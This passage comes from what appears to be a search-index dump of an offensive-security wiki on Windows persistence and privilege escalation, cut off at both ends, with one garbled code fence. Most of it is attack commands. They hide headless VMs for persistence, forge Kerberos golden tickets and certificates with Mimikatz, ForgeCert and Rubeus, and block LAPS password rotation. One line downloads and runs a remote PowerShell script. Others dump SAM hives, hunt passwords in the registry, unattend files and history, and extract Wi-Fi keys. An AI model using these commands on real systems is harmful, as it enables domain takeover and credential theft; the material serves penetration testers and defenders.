&lt;DCs FQDN&gt;\n# Access using the password \"mimikatz\"\nEnter-PSSession -ComputerName &lt;AnyMachineYouLike&gt; -Credential &lt;Domain&gt;\\Administrator\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#virtual-machines","title":"Virtual Machines","text":"<p>Based on the Shadow Bunny technique.</p> <pre><code># download virtualbox\nInvoke-WebRequest \"https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe\" -OutFile $env:TEMP\\VirtualBox-6.1.8-137981-Win.exe\n# perform a silent install and avoid creating desktop and quick launch icons\nVirtualBox-6.0.14-133895-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0\n# in \\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\n# Disabling notifications\n.\\VBoxManage.exe setextradata global GUI/SuppressMessages \"all\" \n# Download the Virtual machine disk\nCopy-Item \\\\smbserver\\images\\shadowbunny.vhd $env:USERPROFILE\\VirtualBox\\IT Recovery\\shadowbunny.vhd\n# Create a new VM\n$vmname = \"IT Recovery\"\n.\\VBoxManage.exe createvm --name $vmname --ostype \"Ubuntu\" --register\n# Add a network card in NAT mode\n.\\VBoxManage.exe modifyvm $vmname --ioapic on  # required for 64bit\n.\\VBoxManage.exe modifyvm $vmname --memory 1024 --vram 128\n.\\VBoxManage.exe modifyvm $vmname --nic1 nat\n.\\VBoxManage.exe modifyvm $vmname --audio none\n.\\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga\n.\\VBoxManage.exe modifyvm $vmname --description \"Shadowbunny\"\n# Mount the VHD file\n.\\VBoxManage.exe storagectl $vmname -name \"SATA Controller\" -add sata\n.\\VBoxManage.exe storageattach $vmname -comment \"Shadowbunny Disk\" -storagectl \"SATA Controller\" -type hdd -medium \"$env:USERPROFILE\\VirtualBox VMs\\IT Recovery\\shadowbunny.vhd\" -port 0\n# Start the VM\n.\\VBoxManage.exe startvm $vmname \u2013type headless \n# optional - adding a shared folder\n# require: VirtualBox Guest Additions\n.\\VBoxManage.exe sharedfolder add $vmname -name shadow_c -hostpath c:\\ -automount\n# then mount the folder in the VM\nsudo mkdir /mnt/c\nsudo mount -t vboxsf shadow_c /mnt/c\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#windows-subsystem-for-linux","title":"Windows Subsystem for Linux","text":"<pre><code># List and install online packages\nwsl --list --online\nwsl --install -d kali-linux\n# Use a local package\nwsl --set-default-version 2\ncurl.exe --insecure -L -o debian.appx https://aka.ms/wsl-debian-gnulinux\nAdd-AppxPackage .\\debian.appx\n# Run the machine as root\nwsl kali-linux --user root\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#domain","title":"Domain","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#user-certificate","title":"User Certificate","text":"<pre><code># Request a certificate for the User template\n.\\Certify.exe request /ca:CA01.megacorp.local\\CA01 /template:User\n# Convert the certificate for Rubeus\nopenssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n# Request a TGT using the certificate\n.\\Rubeus.exe asktgt /user:username /certificate:C:\\Temp\\cert.pfx /password:Passw0rd123!\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#golden-certificate","title":"Golden Certificate","text":"<p>Require elevated privileges in the Active Directory, or on the ADCS machine</p> <ul> <li>Export CA as p12 file: <code>certsrv.msc</code> &gt; <code>Right Click</code> &gt; <code>Back up CA...</code></li> <li>Alternative 1: Using Mimikatz you can extract the certificate as PFX/DER      <pre><code>privilege::debug\ncrypto::capi\ncrypto::cng\ncrypto::certificates /systemstore:local_machine /store:my /export\n</code></pre></li> <li>Alternative 2: Using SharpDPAPI, then convert the certificate: <code>openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx</code></li> <li>ForgeCert - Forge a certificate for any active domain user using the CA certificate     <pre><code>ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName harry@lab.local --NewCertPath harry.pfx --NewCertPassword Password123\nForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123\n</code></pre></li> <li>Finally you can request a TGT using the Certificate     <pre><code>Rubeus.exe asktgt /user:ron /certificate:harry.pfx /password:Password123\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#golden-ticket","title":"Golden Ticket","text":"<p>Forge a Golden ticket using Mimikatz</p> <pre><code>kerberos::purge\nkerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt\nkerberos::tgt\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#laps-persistence","title":"LAPS Persistence","text":"<p>To prevent a machine to update its LAPS password, it is possible to set the update date in the futur.</p> <pre><code>Set-DomainObject -Identity &lt;target_machine&gt; -Set @{\"ms-mcs-admpwdexpirationtime\"=\"232609935231523081\"}\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#references","title":"References","text":"<ul> <li>Windows Persistence Commands - Pwn Wiki</li> <li>SharPersist Windows Persistence Toolkit in C - Brett Hawkins</li> <li>IIS Raid \u2013 Backdooring IIS Using Native Modules - 19/02/2020</li> <li>Old Tricks Are Always Useful: Exploiting Arbitrary File Writes with Accessibility Tools - Apr 27, 2020 - @phraaaaaaa</li> <li>Persistence - Checklist - @netbiosX</li> <li>Persistence \u2013 Winlogon Helper DLL - @netbiosX</li> <li>Persistence - BITS Jobs - @netbiosX</li> <li>Persistence \u2013 Image File Execution Options Injection - @netbiosX</li> <li>Persistence \u2013 Registry Run Keys - @netbiosX</li> <li>Golden Certificate - NOVEMBER 15, 2021</li> <li>Beware of the Shadowbunny - Using virtual machines to persist and evade detections - Sep 23, 2020 - wunderwuzzi</li> <li>Persistence via WMI Event Subscription - Elastic Security Solution</li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/","title":"Windows - Privilege Escalation","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Windows Version and Configuration</li> <li>User Enumeration</li> <li>Network Enumeration</li> <li>Antivirus Enumeration</li> <li>Default Writeable Folders</li> <li>EoP - Looting for passwords<ul> <li>SAM and SYSTEM files</li> <li>HiveNightmare</li> <li>LAPS Settings</li> <li>Search for file contents</li> <li>Search for a file with a certain filename</li> <li>Search the registry for key names and passwords</li> <li>Passwords in unattend.xml</li> <li>Wifi passwords</li> <li>Sticky Notes passwords</li> <li>Passwords stored in services</li> <li>Passwords stored in Key Manager</li> <li>Powershell History</li> <li>Powershell Transcript</li> <li>Password in Alternate Data Stream</li> </ul> </li> <li>EoP - Processes Enumeration and Tasks</li> <li>EoP - Incorrect permissions in services</li> <li>EoP - Windows Subsystem for Linux (WSL)</li> <li>EoP - Unquoted Service Paths</li> <li>EoP - $PATH Interception</li> <li>EoP - Named Pipes</li> <li>EoP - Kernel Exploitation</li> <li>EoP - AlwaysInstallElevated</li> <li>EoP - Insecure GUI apps</li> <li>EoP - Evaluating Vulnerable Drivers</li> <li>EoP - Printers<ul> <li>Universal Printer</li> <li>Bring Your Own Vulnerability</li> </ul> </li> <li>EoP - Runas</li> <li>EoP - Abusing Shadow Copies</li> <li>EoP - From local administrator to NT SYSTEM</li> <li>EoP - Living Off The Land Binaries and Scripts</li> <li>EoP - Impersonation Privileges<ul> <li>Restore A Service Account's Privileges</li> <li>Meterpreter getsystem and alternatives</li> <li>RottenPotato (Token Impersonation)</li> <li>Juicy Potato (Abusing the golden privileges)</li> <li>Rogue Potato (Fake OXID Resolver))</li> <li>EFSPotato (MS-EFSR EfsRpcOpenFileRaw))</li> </ul> </li> <li>EoP - Privileged File Write<ul> <li>DiagHub</li> <li>UsoDLLLoader</li> <li>WerTrigger</li> <li>WerMgr</li> </ul> </li> <li>EoP - Common Vulnerabilities and Exposures<ul> <li>MS08-067 (NetAPI)</li> <li>MS10-015 (KiTrap0D)</li> <li>MS11-080 (adf.sys)</li> <li>MS15-051 (Client Copy Image)</li> <li>MS16-032</li> <li>MS17-010 (Eternal Blue)</li> <li>CVE-2019-1388</li> </ul> </li> <li>EoP - $PATH Interception</li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#tools","title":"Tools","text":"<ul> <li>PowerSploit's PowerUp <pre><code>powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks\n</code></pre></li> <li>Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock</li> <li>(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities <pre><code>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1\n</code></pre></li> <li>BeRoot - Privilege Escalation Project - Windows / Linux / Mac</li> <li>Windows-Exploit-Suggester <pre><code>./windows-exploit-suggester.py --update\n./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt \n</code></pre></li> <li>windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems</li> <li>WindowsExploits - Windows exploits, mostly precompiled. Not being updated.</li> <li>WindowsEnum - A Powershell Privilege Escalation Enumeration Script.</li> <li>Seatbelt - A C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives. <pre><code>Seatbelt.exe -group=all -full\nSeatbelt.exe -group=system -outputfile=\"C:\\Temp\\system.txt\"\nSeatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\\sam -password=\"yum \\\"po-ta-toes\\\"\"\n</code></pre></li> <li>Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind</li> <li>JAWS - Just Another Windows (Enum) Script <pre><code>powershell.exe -ExecutionPolicy Bypass -File .\\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt\n</code></pre></li> <li>winPEAS - Windows Privilege Escalation Awesome Script</li> <li>Windows Exploit Suggester - Next Generation (WES-NG) <pre><code># First obtain systeminfo\nsysteminfo\nsysteminfo &gt; systeminfo.txt\n# Then feed it to wesng\npython3 wes.py --update-wes\npython3 wes.py --update\npython3 wes.py systeminfo.txt\n</code></pre></li> <li>PrivescCheck - Privilege Escalation Enumeration Script for Windows <pre><code>C:\\Temp\\&gt;powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck\"\nC:\\Temp\\&gt;powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended\"\nC:\\Temp\\&gt;powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML\"\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#windows-version-and-configuration","title":"Windows Version and Configuration","text":"<pre><code>systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\n</code></pre> <p>Extract patchs and updates <pre><code>wmic qfe\n</code></pre></p> <p>Architecture</p> <pre><code>wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%\n</code></pre> <p>List all env variables</p> <pre><code>set\nGet-ChildItem Env: | ft Key,Value\n</code></pre> <p>List all drives</p> <pre><code>wmic logicaldisk get caption || fsutil fsinfo drives\nwmic logicaldisk get caption,description,providername\nGet-PSDrive | where {$_.Provider -like \"Microsoft.PowerShell.Core\\FileSystem\"}| ft Name,Root\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#user-enumeration","title":"User Enumeration","text":"<p>Get current username</p> <pre><code>echo %USERNAME% || whoami\n$env:username\n</code></pre> <p>List user privilege</p> <pre><code>whoami /priv\nwhoami /groups\n</code></pre> <p>List all users</p> <pre><code>net user\nwhoami /all\nGet-LocalUser | ft Name,Enabled,LastLogon\nGet-ChildItem C:\\Users -Force | select Name\n</code></pre> <p>List logon requirements; useable for bruteforcing</p> <p>```powershell$env:usernadsc net accounts <pre><code>Get details about a user (i.e. administrator, admin, current user)\n\n```powershell\nnet user administrator\nnet user admin\nnet user %USERNAME%\n</code></pre></p> <p>List all local groups</p> <pre><code>net localgroup\nGet-LocalGroup | ft Name\n</code></pre> <p>Get details about a group (i.e. administrators)</p> <pre><code>net localgroup administrators\nGet-LocalGroupMember Administrators | ft Name, PrincipalSource\nGet-LocalGroupMember Administrateurs | ft Name, PrincipalSource\n</code></pre> <p>Get Domain Controllers</p> <pre><code>nltest /DCLIST:DomainName\nnltest /DCNAME:DomainName\nnltest /DSGETDC:DomainName\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#network-enumeration","title":"Network Enumeration","text":"<p>List all network interfaces, IP, and DNS.</p> <pre><code>ipconfig /all\nGet-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address\nGet-DnsClientServerAddress -AddressFamily IPv4 | ft\n</code></pre> <p>List current routing table</p> <pre><code>route print\nGet-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex\n</code></pre> <p>List the ARP table</p> <pre><code>arp -A\nGet-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State\n</code></pre> <p>List all current connections</p> <pre><code>netstat -ano\n</code></pre> <p>List all network shares</p> <pre><code>net share\npowershell Find-DomainShare -ComputerDomain domain.local\n</code></pre> <p>SNMP Configuration</p> <pre><code>reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s\nGet-ChildItem -path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#antivirus-enumeration","title":"Antivirus Enumeration","text":"<p>Enumerate antivirus on a box with <code>WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName</code></p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#default-writeable-folders","title":"Default Writeable Folders","text":"<pre><code>C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\nC:\\Windows\\System32\\spool\\drivers\\color\nC:\\Windows\\System32\\spool\\printers\nC:\\Windows\\System32\\spool\\servers\nC:\\Windows\\tracing\nC:\\Windows\\Temp\nC:\\Users\\Public\nC:\\Windows\\Tasks\nC:\\Windows\\System32\\tasks\nC:\\Windows\\SysWOW64\\tasks\nC:\\Windows\\System32\\tasks_migrated\\microsoft\\windows\\pls\\system\nC:\\Windows\\SysWOW64\\tasks\\microsoft\\windows\\pls\\system\nC:\\Windows\\debug\\wia\nC:\\Windows\\registration\\crmlog\nC:\\Windows\\System32\\com\\dmp\nC:\\Windows\\SysWOW64\\com\\dmp\nC:\\Windows\\System32\\fxstmp\nC:\\Windows\\SysWOW64\\fxstmp\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-looting-for-passwords","title":"EoP - Looting for passwords","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#sam-and-system-files","title":"SAM and SYSTEM files","text":"<p>The Security Account Manager (SAM), often Security Accounts Manager, is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM.</p> <pre><code># Usually %SYSTEMROOT% = C:\\Windows\n%SYSTEMROOT%\\repair\\SAM\n%SYSTEMROOT%\\System32\\config\\RegBack\\SAM\n%SYSTEMROOT%\\System32\\config\\SAM\n%SYSTEMROOT%\\repair\\system\n%SYSTEMROOT%\\System32\\config\\SYSTEM\n%SYSTEMROOT%\\System32\\config\\RegBack\\system\n</code></pre> <p>Generate a hash file for John using <code>pwdump</code> or <code>samdump2</code>.</p> <pre><code>pwdump SYSTEM SAM &gt; /root/sam.txt\nsamdump2 SYSTEM SAM -o sam.txt\n</code></pre> <p>Either crack it with <code>john -format=NT /root/sam.txt</code>, hashcat or use Pass-The-Hash.</p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#hivenightmare","title":"HiveNightmare","text":"<p>CVE-2021\u201336934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user</p> <p>Check for the vulnerability using <code>icacls</code></p> <pre><code>C:\\Windows\\System32&gt; icacls config\\SAM\nconfig\\SAM BUILTIN\\Administrators:(I)(F)\nNT AUTHORITY\\SYSTEM:(I)(F)\nBUILTIN\\Users:(I)(RX)    &lt;-- this is wrong - regular users should not have read access!\n</code></pre> <p>Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.</p> <pre><code>mimikatz&gt; token::whoami /full\n# List shadow copies available\nmimikatz&gt; misc::shadowcopies\n# Extract account from SAM databases\nmimikatz&gt; lsadump::sam /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /sam:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM\n# Extract secrets from SECURITY\nmimikatz&gt; lsadump::secrets /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /security:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#laps-settings","title":"LAPS Settings","text":"<p>Extract <code>HKLM\\Software\\Policies\\Microsoft Services\\AdmPwd</code> from Windows Registry.</p> <ul> <li>LAPS Enabled: AdmPwdEnabled</li> <li>LAPS Admin Account Name: AdminAccountName</li> <li>LAPS Password Complexity: PasswordComplexity</li> <li>LAPS Password Length: PasswordLength</li> <li>LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled</li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#search-for-file-contents","title":"Search for file contents","text":"<pre><code>cd C:\\ &amp; findstr /SI /M \"password\" *.xml *.ini *.txt\nfindstr /si password *.xml *.ini *.txt *.config 2&gt;nul &gt;&gt; results.txt\nfindstr /spin \"password\" *.*\n</code></pre> <p>Also search in remote places such as SMB Shares and SharePoint:</p> <ul> <li>Search passwords in SharePoint: nheiniger/SnaffPoint (must be compiled first, for referencing issue see: https://github.com/nheiniger/SnaffPoint/pull/6)</li> </ul> <pre><code># First, retrieve a token\n## Method 1: using SnaffPoint binary\n$token = (.\\GetBearerToken.exe https://your.sharepoint.com)\n## Method 2: using AADInternals\nInstall-Module AADInternals -Scope CurrentUser\nImport-Module AADInternals\n$token = (Get-AADIntAccessToken -ClientId \"9bc3ab49-b65d-410a-85ad-de819febfddc\" -Tenant \"your.onmicrosoft.com\" -Resource \"https://your.sharepoint.com\")\n# Second, search on Sharepoint\n## Method 1: using search strings in ./presets dir\n.\\SnaffPoint.exe -u \"https://your.sharepoint.com\" -t $token\n## Method 2: using search string in command line\n### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference\n.\\SnaffPoint.exe -u \"https://your.sharepoint.com\" -t $token -l -q \"filename:.config\"\n</code></pre> <ul> <li>Search passwords in SMB Shares: SnaffCon/Snaffler</li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#search-for-a-file-with-a-certain-filename","title":"Search for a file with a certain filename","text":"<pre><code>dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*\nwhere /R C:\\ user.txt\nwhere /R C:\\ *.ini\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#search-the-registry-for-key-names-and-passwords","title":"Search the registry for key names and passwords","text":"<pre><code>REG QUERY HKLM /F \"password\" /t REG_SZ /S /K\nREG QUERY HKCU /F \"password\" /t REG_SZ /S /K\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" # Windows Autologin\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2&gt;nul | findstr \"DefaultUserName DefaultDomainName DefaultPassword\" \nreg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" # SNMP parameters\nreg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" # Putty clear text proxy credentials\nreg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" # VNC credentials\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#passwords-in-unattendxml","title":"Passwords in unattend.xml","text":"<p>Location of the unattend.xml files.</p> <pre><code>C:\\unattend.xml\nC:\\Windows\\Panther\\Unattend.xml\nC:\\Windows\\Panther\\Unattend\\Unattend.xml\nC:\\Windows\\system32\\sysprep.inf\nC:\\Windows\\system32\\sysprep\\sysprep.xml\n</code></pre> <p>Display the content of these files with <code>dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul</code>.</p> <p>Example content</p> <pre><code>&lt;component name=\"Microsoft-Windows-Shell-Setup\" publicKeyToken=\"31bf3856ad364e35\" language=\"neutral\" versionScope=\"nonSxS\" processorArchitecture=\"amd64\"&gt;\n&lt;AutoLogon&gt;\n&lt;Password&gt;U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==&lt;/Password&gt;\n&lt;Enabled&gt;true&lt;/Enabled&gt;\n&lt;Username&gt;Administrateur&lt;/Username&gt;\n&lt;/AutoLogon&gt;\n&lt;UserAccounts&gt;\n&lt;LocalAccounts&gt;\n&lt;LocalAccount wcm:action=\"add\"&gt;\n&lt;Password&gt;*SENSITIVE*DATA*DELETED*&lt;/Password&gt;\n&lt;Group&gt;administrators;users&lt;/Group&gt;\n&lt;Name&gt;Administrateur&lt;/Name&gt;\n&lt;/LocalAccount&gt;\n&lt;/LocalAccounts&gt;\n&lt;/UserAccounts&gt;\n</code></pre> <p>Unattend credentials are stored in base64 and can be decoded manually with base64.</p> <pre><code>$ echo \"U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=\"  | base64 -d \nSecretSecurePassword1234*\n</code></pre> <p>The Metasploit module <code>post/windows/gather/enum_unattend</code> looks for these files.</p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#iis-web-config","title":"IIS Web config","text":"<pre><code>Get-Childitem \u2013Path C:\\inetpub\\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue\n</code></pre> <pre><code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config\nC:\\inetpub\\wwwroot\\web.config\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#other-files","title":"Other files","text":"<pre><code>%SYSTEMDRIVE%\\pagefile.sys\n%WINDIR%\\debug\\NetSetup.log\n%WINDIR%\\repair\\sam\n%WINDIR%\\repair\\system\n%WINDIR%\\repair\\software, %WINDIR%\\repair\\security\n%WINDIR%\\iis6.log\n%WINDIR%\\system32\\config\\AppEvent.Evt\n%WINDIR%\\system32\\config\\SecEvent.Evt\n%WINDIR%\\system32\\config\\default.sav\n%WINDIR%\\system32\\config\\security.sav\n%WINDIR%\\system32\\config\\software.sav\n%WINDIR%\\system32\\config\\system.sav\n%WINDIR%\\system32\\CCM\\logs\\*.log\n%USERPROFILE%\\ntuser.dat\n%USERPROFILE%\\LocalS~1\\Tempor~1\\Content.IE5\\index.dat\n%WINDIR%\\System32\\drivers\\etc\\hosts\nC:\\ProgramData\\Configs\\*\nC:\\Program Files\\Windows PowerShell\\*\ndir c:*vnc.ini /s /b\ndir c:*ultravnc.ini /s /b\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#wifi-passwords","title":"Wifi passwords","text":"<p>Find AP SSID <pre><code>netsh wlan show profile\n</code></pre></p> <p>Get Cleartext Pass <pre><code>netsh wlan show profile &lt;SSID&gt; key=clear\n</code></pre></p> <p>Oneliner method to extract wifi passwords from all the access point.</p> <pre><code>cls &amp; echo. &amp; for /f \"tokens=4 delims=: \" %a in ('netsh wlan show profiles ^| find \"Profile \"') do @echo off &gt; nul &amp; (netsh wlan show profiles name=%a key=clear | findstr \"SSID Cipher Content\" | find /v \"Number\" &amp; echo.) &amp; @echo on\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#sticky-notes-passwords","title":"Sticky Notes passwords","text":"<p>The sticky notes app stores it's content in a sqlite db located at <code>C:\\Users\\&lt;user&gt;\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite</code></p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#passwords-stored-in-services","title":"Passwords stored in services","text":"<p>Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher</p> <pre><code>https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1\nImport-Module path\\to\\SessionGopher.ps1;\nInvoke-SessionGopher -AllDomain -o\nInvoke-SessionGopher -AllDomain -u domain.com\\adm-arvanaghi -p s3cr3tP@ss\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#passwords-stored-in-key-manager","title":"Passwords stored in Key Manager","text":"<p> This software will display its output in a GUI</p> <pre><code>rundll32 keymgr,KRShowKeyMgr\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#powershell-history","title":"Powershell History","text":"<p>Disable Powershell history: <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.</p> <pre><code>type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\ntype C:\\Users\\swissky\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\ntype $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\ncat (Get-PSReadlineOption).HistorySavePath\ncat (Get-PSReadlineOption).HistorySavePath | sls passw\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#powershell-transcript","title":"Powershell Transcript","text":"<pre><code>C:\\Users\\&lt;USERNAME&gt;\\Documents\\PowerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt\nC:\\Transcripts\\&lt;DATE&gt;\\PowerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#password-in-alternate-data-stream","title":"Password in Alternate Data Stream","text":"<pre><code>PS &gt; Get-Item -path flag.txt -Stream *\nPS &gt; Get-Content -path flag.txt -Stream Flag\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-processes-enumeration-and-tasks","title":"EoP - Processes Enumeration and Tasks","text":"<ul> <li> <p>What processes are running?     <pre><code>tasklist /v\nnet start\nsc query\nGet-Service\nGet-Process\nGet-WmiObject -Query \"Select * from Win32_Process\" | where {$_.Name -notlike \"svchost*\"} | Select Name, Handle, @{Label=\"Owner\";Expression={$_.GetOwner().User}} | ft -AutoSize\n</code></pre></p> </li> <li> <p>Which processes are running as \"system\"     <pre><code>tasklist /v /fi \"username eq system\"\n</code></pre></p> </li> <li> <p>Do you have powershell magic?     <pre><code>REG QUERY \"HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine\" /v PowerShellVersion\n</code></pre></p> </li> <li> <p>List installed programs     <pre><code>Get-ChildItem 'C:\\Program Files', 'C:\\Program Files (x86)' | ft Parent,Name,LastWriteTime\nGet-ChildItem -path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE | ft Name\n</code></pre></p> </li> <li> <p>List services     <pre><code>net start\nwmic service list brief\ntasklist /SVC\n</code></pre></p> </li> <li> <p>Enumerate scheduled tasks     <pre><code>schtasks /query /fo LIST 2&gt;nul | findstr TaskName\nschtasks /query /fo LIST /v &gt; schtasks.txt; cat schtask.txt | grep \"SYSTEM\\|Task To Run\" | grep -B 1 SYSTEM\nGet-ScheduledTask | where {$_.TaskPath -notlike \"\\Microsoft*\"} | ft TaskName,TaskPath,State\n</code></pre></p> </li> <li> <p>Startup tasks     <pre><code>wmic startup get caption,command\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\R\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\ndir \"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\"\ndir \"C:\\Documents and 